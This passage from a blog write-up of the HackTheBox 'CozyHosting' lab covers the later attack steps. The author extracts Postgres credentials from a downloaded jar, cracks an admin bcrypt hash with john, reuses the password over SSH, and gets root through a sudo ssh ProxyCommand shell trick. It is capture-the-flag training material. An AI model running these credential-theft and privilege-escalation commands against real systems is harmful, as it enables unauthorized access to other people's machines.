+</div><h3 id="user-enumeration">User Enumeration
+</h3><p>In the current working directory, we have a compiled jar file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app@cozyhosting:/app$ ls
+</span></span><span class="line"><span class="cl">cloudhosting-0.0.1.jar
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This can be extracted very simply, but first I will transfer this to my kali machine</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app@cozyhosting:/app$ python3 -m http.server 8888
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On the kali:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ wget cozyhosting.htb:8888/cloudhosting-0.0.1.jar                                         
+</span></span><span class="line"><span class="cl">--2023-09-03 01:16:45--  http://cozyhosting.htb:8888/cloudhosting-0.0.1.jar
+</span></span><span class="line"><span class="cl">Resolving cozyhosting.htb (cozyhosting.htb)... 10.129.105.187
+</span></span><span class="line"><span class="cl">Connecting to cozyhosting.htb (cozyhosting.htb)|10.129.105.187|:8888... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... 200 OK
+</span></span><span class="line"><span class="cl">Length: 60259688 (57M) [application/java-archive]
+</span></span><span class="line"><span class="cl">Saving to: ‘cloudhosting-0.0.1.jar’
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cloudhosting-0.0.1.jar       100%[==============================================&gt;]  57.47M  1.49MB/s    in 39s     
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2023-09-03 01:17:24 (1.47 MB/s) - ‘cloudhosting-0.0.1.jar’ saved [60259688/60259688]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After unzipping, we can find information in the application.properties:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat BOOT-INF/classes/application.properties 
+</span></span><span class="line"><span class="cl">server.address=127.0.0.1
+</span></span><span class="line"><span class="cl">server.servlet.session.timeout=5m
+</span></span><span class="line"><span class="cl">management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+</span></span><span class="line"><span class="cl">management.endpoint.sessions.enabled = true
+</span></span><span class="line"><span class="cl">spring.datasource.driver-class-name=org.postgresql.Driver
+</span></span><span class="line"><span class="cl">spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+</span></span><span class="line"><span class="cl">spring.jpa.hibernate.ddl-auto=none
+</span></span><span class="line"><span class="cl">spring.jpa.database=POSTGRESQL
+</span></span><span class="line"><span class="cl">spring.datasource.platform=postgres
+</span></span><span class="line"><span class="cl">spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+</span></span><span class="line"><span class="cl">spring.datasource.username=postgres
+</span></span><span class="line"><span class="cl">spring.datasource.password=Vg&amp;nvzAQ7XxR
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here, we have credentials for postgres.</p>
+<h3 id="cracking-password-hashes-from-postgres-database">Cracking password hashes from postgres database
+</h3><p>Connecting to postgres:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app@cozyhosting:/app$ psql -h localhost -d cozyhosting -U postgres
+</span></span><span class="line"><span class="cl">Password for user postgres: 
+</span></span><span class="line"><span class="cl">psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+</span></span><span class="line"><span class="cl">SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+</span></span><span class="line"><span class="cl">Type &#34;help&#34; for help.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cozyhosting=# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Enumerating the postgres database:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cozyhosting=# SELECT * FROM users;                     
+</span></span><span class="line"><span class="cl">WARNING: terminal is not fully functional
+</span></span><span class="line"><span class="cl">Press RETURN to continue 
+</span></span><span class="line"><span class="cl">   name    |                           password                           | role
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">-----------+--------------------------------------------------------------+-----
+</span></span><span class="line"><span class="cl">--
+</span></span><span class="line"><span class="cl"> kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+</span></span><span class="line"><span class="cl"> admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
+</span></span><span class="line"><span class="cl">n
+</span></span><span class="line"><span class="cl">(2 rows)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Perhaps we can crack the admin password? Indeed we can, and it cracks to the classic manchesterunited:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">john</span> <span class="nb">hash</span> <span class="o">--</span><span class="n">wordlist</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>  
+</span></span><span class="line"><span class="cl"><span class="n">Using</span> <span class="n">default</span> <span class="n">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">bcrypt</span> <span class="p">[</span><span class="n">Blowfish</span> <span class="mi">32</span><span class="o">/</span><span class="mi">64</span> <span class="n">X3</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cost</span> <span class="mi">1</span> <span class="p">(</span><span class="n">iteration</span> <span class="n">count</span><span class="p">)</span> <span class="n">is</span> <span class="mi">1024</span> <span class="k">for</span> <span class="n">all</span> <span class="n">loaded</span> <span class="n">hashes</span>
+</span></span><span class="line"><span class="cl"><span class="n">Will</span> <span class="n">run</span> <span class="mi">2</span> <span class="n">OpenMP</span> <span class="n">threads</span>
+</span></span><span class="line"><span class="cl"><span class="n">Press</span> <span class="s1">&#39;q&#39;</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="n">almost</span> <span class="n">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>
+</span></span><span class="line"><span class="cl"><span class="n">manchesterunited</span> <span class="p">(</span><span class="err">?</span><span class="p">)</span>     
+</span></span><span class="line"><span class="cl"><span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">33</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2023</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">03</span> <span class="mi">01</span><span class="p">:</span><span class="mi">53</span><span class="p">)</span> <span class="mf">0.02980</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mf">83.69</span><span class="n">p</span><span class="o">/</span><span class="n">s</span> <span class="mf">83.69</span><span class="n">c</span><span class="o">/</span><span class="n">s</span> <span class="mf">83.69</span><span class="n">C</span><span class="o">/</span><span class="n">s</span> <span class="n">dougie</span><span class="o">..</span><span class="n">keyboard</span>
+</span></span><span class="line"><span class="cl"><span class="n">Use</span> <span class="n">the</span> <span class="s2">&#34;--show&#34;</span> <span class="n">option</span> <span class="n">to</span> <span class="n">display</span> <span class="n">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
+</span></span><span class="line"><span class="cl"><span class="n">Session</span> <span class="n">completed</span><span class="o">.</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>admin:manchesterunited</code></p>
+<p>For potential targets on the box, we can check <code>/etc/passwd</code> for the valid accounts. When we grep for lines ending in <code>sh</code>, we are omitting most non-user accounts with shells like <code>nologin</code> or <code>false</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span><span class="o">$</span>
+</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">app</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
+</span></span><span class="line"><span class="cl"><span class="n">postgres</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">114</span><span class="p">:</span><span class="mi">120</span><span class="p">:</span><span class="n">PostgreSQL</span> <span class="n">administrator</span><span class="p">,,,:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">postgresql</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">josh</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1003</span><span class="p">:</span><span class="mi">1003</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">josh</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With josh as the primary candidate, we can try to use ssh login:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ssh josh@cozyhosting.htb
+</span></span><span class="line"><span class="cl">josh@cozyhosting.htb&#39;s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64)
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It does indeed work as josh&rsquo;s password. If it hadn&rsquo;t the next guess would be for root, which also might not allow ssh authentication. By default, root authentication over ssh is not allowed.</p>
+<h2 id="privilege-escalation">Privilege Escalation
+</h2><h3 id="gtfobins-on-suid">GTFOBins on SUID
+</h3><p>Josh can ssh as root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">josh@cozyhosting:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for josh on localhost:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User josh may run the following commands on localhost:
+</span></span><span class="line"><span class="cl">    (root) /usr/bin/ssh *
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Checking <a class="link" href="https://gtfobins.github.io/gtfobins/ssh/#sudo"  target="_blank" rel="noopener"
+    >gtfobins</a>, we have an easy win:</p>
+<p><img src="/p/hackthebox-cozyhosting/Images/gtfobins.png"
+	width="841"
+	height="218"
+	srcset="/p/hackthebox-cozyhosting/Images/gtfobins_hu398867684362438302.png 480w, /p/hackthebox-cozyhosting/Images/gtfobins_hu14643658372758777910.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="385"
+		data-flex-basis="925px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">josh@cozyhosting:~$ sudo ssh -o ProxyCommand=&#39;;sh 0&lt;&amp;2 1&gt;&amp;2&#39; x
+</span></span><span class="line"><span class="cl"># whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/command-injection/">Command Injection</a>
+        
+            <a href="/tags/spring-boot/">Spring Boot</a>
+        
+            <a href="/tags/session-hijack/">Session Hijack</a>
+        
+            <a href="/tags/ssh/">Ssh</a>
+        
+            <a href="/tags/postgres/">Postgres</a>
+        
+            <a href="/tags/java/">Java</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-surveillance/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-surveillance/Surveillance.8b9fd8fd814572f9ed8f343a005ca93c_hu1936471103572467903.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Surveillance"
+                        
+                        data-hash="md5-i5/Y/YFFcvntjzQ6AFypPA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Surveillance</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-sau/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-sau/Sau.e47c82080c294ed27892e64446e0941f_hu4137443262157332936.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Sau"
+                        
+                        data-hash="md5-5HyCCAwpTtJ4kuZERuCUHw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Sau</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-onlyforyou/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-onlyforyou/OnlyForYou.23aaa710c708eb7341f08b78acb7d1aa_hu13502282750288352538.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - OnlyForYou"
+                        
+                        data-hash="md5-I6qnEMcI63NB8It4rLfRqg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - OnlyForYou</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-mailroom/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-mailroom/Mailroom.0954462925d337843baeedfaf8bb9ccf_hu4146993554582274269.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Mailroom"
+                        
+                        data-hash="md5-CVRGKSXTN4Q7ru36&#43;Luczw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Mailroom</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/hackthebox-devvortex/">
+        
+        
+            <div class="article-image">
+                <img src="/p/hackthebox-devvortex/Devvortex.61ba3466bff8da52f89d2bb6417fb83a_hu4257021157125360887.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Devvortex"
+                        
+                        data-hash="md5-Ybo0Zr/42lL4nSu2QX&#43;4Og==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Devvortex</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2024 Spencer&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
